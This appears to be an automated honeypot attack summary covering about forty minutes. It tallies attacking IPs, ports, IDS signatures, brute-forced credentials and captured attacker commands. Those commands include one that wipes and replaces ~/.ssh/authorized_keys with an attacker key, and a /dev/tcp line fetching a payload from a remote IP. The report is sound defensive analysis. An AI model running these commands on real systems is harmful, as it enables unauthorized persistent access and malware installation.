
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-17T02:01:53Z
**Timeframe:** 2025-10-17T01:20:01Z - 2025-10-17T02:00:01Z
**Files Used:**
- agg_log_20251017T012001Z.json
- agg_log_20251017T014001Z.json
- agg_log_20251017T020001Z.json

---

## Executive Summary

This report summarizes 12,268 events collected from the honeypot network. The majority of attacks were captured by the Cowrie, Honeytrap, and Ciscoasa honeypots. The most targeted service was SIP (port 5060). A significant number of SSH brute-force attempts and reconnaissance activities were observed. Noteworthy is the repeated attempt to install a malicious SSH key.

---

## Detailed Analysis

### Attacks by Honeypot

- **Cowrie:** 3908
- **Honeytrap:** 3013
- **Ciscoasa:** 1644
- **Suricata:** 1376
- **Sentrypeer:** 1351
- **Dionaea:** 426
- **Redishoneypot:** 312
- **Mailoney:** 125
- **Tanner:** 32
- **ssh-rsa:** 20
- **H0neytr4p:** 17
- **Honeyaml:** 14
- **ConPot:** 13
- **Dicompot:** 8
- **ElasticPot:** 3
- **Heralding:** 3
- **Ipphoney:** 3

### Top Attacking IPs

- **172.86.95.115:** 496
- **172.86.95.98:** 485
- **174.138.116.10:** 450
- **49.4.61.236:** 390
- **103.214.112.160:** 312
- **143.244.134.97:** 297
- **185.116.160.35:** 288
- **84.17.34.104:** 267
- **160.187.147.127:** 253
- **107.170.36.5:** 230
- **109.206.241.199:** 229
- **154.201.90.141:** 224

### Top Targeted Ports/Protocols

- **5060:** 1351
- **22:** 537
- **445:** 340
- **6379:** 309
- **8333:** 200
- **5903:** 191
- **25:** 127
- **1433:** 44
- **TCP/1433:** 14

### Most Common CVEs

- **CVE-2002-0013 CVE-2002-0012:** 6
- **CVE-2001-0414:** 2
- **CVE-2019-11500 CVE-2019-11500:** 1

### Commands Attempted by Attackers

- **cd ~; chattr -ia .ssh; lockr -ia .ssh:** 20
- **lockr -ia .ssh:** 20
- **cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~:** 20
- **cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}':** 20
- **free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}':** 20
- **ls -lh $(which ls):** 20
- **which ls:** 20
- **crontab -l:** 20
- **w:** 20
- **uname -m:** 20
- **cat /proc/cpuinfo | grep model | grep name | wc -l:** 20
- **top:** 20
- **uname:** 20
- **uname -a:** 21
- **whoami:** 20
- **lscpu | grep Model:** 20
- **df -h | head -n 2 | awk 'FNR == 2 {print $2;}':** 19
- **Enter new UNIX password: :** 16
- **Enter new UNIX password:** 16
- **cat /proc/cpuinfo | grep name | wc -l:** 19

### Signatures Triggered

- **ET DROP Dshield Block Listed Source group 1:** 423
- **2402000:** 423
- **ET SCAN NMAP -sS window 1024:** 148
- **2009582:** 148
- **ET SCAN MS Terminal Server Traffic on Non-standard Port:** 85
- **2023753:** 85
- **ET INFO Reserved Internal IP Traffic:** 59
- **2002752:** 59
- **ET CINS Active Threat Intelligence Poor Reputation IP group 49:** 32
- **2403348:** 32
- **ET CINS Active Threat Intelligence Poor Reputation IP group 47:** 35
- **2403346:** 35
- **ET CINS Active Threat Intelligence Poor Reputation IP group 45:** 29
- **2403344:** 29
- **ET CINS Active Threat Intelligence Poor Reputation IP group 44:** 25
- **2403343:** 25

### Users / Login Attempts

- **345gs5662d34/345gs5662d34:** 18
- **root/:** 20
- **root/Qaz123qaz:** 10
- **root/123@@@:** 8
- **test/6666:** 6
- **nobody/qwerty12345:** 6
- **root/root2011:** 6
- **user/3333333:** 4
- **support/support2017:** 4
- **blank/blank2016:** 4
- **blank/666:** 4
- **test/test88:** 4
- **operator/operator2007:** 4
- **blank/blank2021:** 4
- **root/00cb4865BB:** 4
- **root/==c0balt==:** 4
- **debian/debian33:** 4
- **root/0_1652bfL:** 4

### Files Uploaded/Downloaded

- **SOAP-ENV:Envelope>:** 6

### HTTP User-Agents
- No user agents recorded in this period.

### SSH Clients and Servers
- No specific SSH clients or servers recorded in this period.

### Top Attacker AS Organizations
- No attacker AS organizations recorded in this period.

---

## Key Observations and Anomalies

- A large number of commands executed are reconnaissance commands to understand the system's architecture (`uname`, `lscpu`, `cat /proc/cpuinfo`).
- The command `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys...` indicates a clear attempt to install a persistent SSH key for unauthorized access. The base64 encoded key and the "mdrfckr" comment are notable.
- The `nohup bash -c "exec 6<>/dev/tcp/47.93.126.234/60143...` command attempts to download and execute a payload from a remote server. This is a common technique for malware droppers.
- The high volume of traffic on port 5060 suggests widespread scanning for vulnerable SIP services.
